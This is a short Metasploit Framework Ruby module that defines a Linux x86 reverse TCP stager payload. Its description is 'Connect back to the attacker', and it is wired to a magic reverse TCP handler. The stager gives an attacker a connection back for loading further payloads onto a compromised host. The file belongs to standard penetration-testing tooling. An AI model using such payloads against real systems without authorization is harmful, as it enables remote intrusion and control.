##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 123

  include Msf::Payload::Stager
  include Msf::Payload::Linux::ReverseTcpX86

  def self.handler_type_alias
    'magic_reverse_tcp'
  end

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Reverse TCP Stager',
        'Description' => 'Connect back to the attacker',
        'Author' => [ 'Siras' ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X86,
        'Handler' => Msf::Handler::MagicReverseTcp,
        'Stager' => { 'Payload' => '' }
      )
    )
  end

  def include_send_magic
    true
  end
end
